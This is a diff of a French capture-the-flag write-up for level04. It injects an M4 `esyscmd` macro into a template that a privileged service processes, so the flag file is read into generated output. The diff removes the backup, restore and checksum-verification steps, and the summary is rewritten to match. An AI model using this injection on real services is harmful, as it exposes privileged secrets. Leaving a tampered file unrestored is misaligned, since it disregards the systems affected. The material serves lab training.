@@ -82,16 +82,9 @@ esyscmd(`cat /home/flag04/.flag')
 
 Le résultat de `cat` est inséré dans le document généré par M4, puis écrit dans `/var/lib/babel/output.conf`.
 
-## 5. Sauvegarder puis modifier le modèle
+## 5. Modifier le modèle
 
-Sauvegarder le fichier original et son empreinte avant toute modification :
-
-```bash
-cp /var/lib/babel/templates/template.m4 /tmp/template.m4.bak
-sha256sum /tmp/template.m4.bak
-```
-
-Ajouter ensuite le payload à la fin du modèle :
+Ajouter le payload à la fin du modèle :
 
 ```bash
 cat >> /var/lib/babel/templates/template.m4 <<'EOF'
@@ -122,24 +115,7 @@ ne2searoevaevoem4ov4ar8ap
 
 `tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.
 
-## 7. Restaurer et vérifier
-
-Restaurer le modèle original, puis comparer les empreintes :
-
-```bash
-cat /tmp/template.m4.bak > /var/lib/babel/templates/template.m4
-sha256sum /tmp/template.m4.bak /var/lib/babel/templates/template.m4
-```
-
-Les deux empreintes doivent être identiques. Attendre ensuite que le service régénère `output.conf` et vérifier que le secret n’y apparaît plus. La sauvegarde peut alors être supprimée :
-
-```bash
-rm -f /tmp/template.m4.bak
-```
-
-Les notes confirment que les empreintes étaient identiques après restauration et que le fichier généré ne contenait plus le secret.
-
-## 8. Passer à `level05`
+## 7. Passer à `level05`
 
 ```bash
 su - level05
@@ -161,8 +137,8 @@ Les niveaux 03 et 04 exploitent la même erreur de confiance : un service privil
 
 ## À expliquer à l’évaluation
 
-> J’ai vérifié que `level04` pouvait modifier un modèle M4 traité par un service exécuté sous `flag04`. J’ai sauvegardé le modèle, ajouté une macro `esyscmd` qui lit le flag, puis récupéré sa sortie dans le fichier généré. Enfin, j’ai restauré le modèle, vérifié son empreinte et validé le secret avec `level05`.
+> J’ai vérifié que `level04` pouvait modifier un modèle M4 traité par un service exécuté sous `flag04`. J’ai ajouté une macro `esyscmd` qui lit le flag, puis récupéré sa sortie dans le fichier généré. J’ai ensuite validé le secret avec `level05`.
 
 ## Traçabilité à conserver
 
-Conserver les sorties de `id`, `systemctl cat`, `ls -l`, des deux vérifications `sha256sum`, de `tail` avant et après restauration, ainsi que de `id -un`. La recherche initiale qui a permis d’identifier Babel reste également à documenter sur la VM.
+Conserver les sorties de `id`, `systemctl cat`, `ls -l`, `tail` et `id -un`. La recherche initiale qui a permis d’identifier Babel reste également à documenter sur la VM.
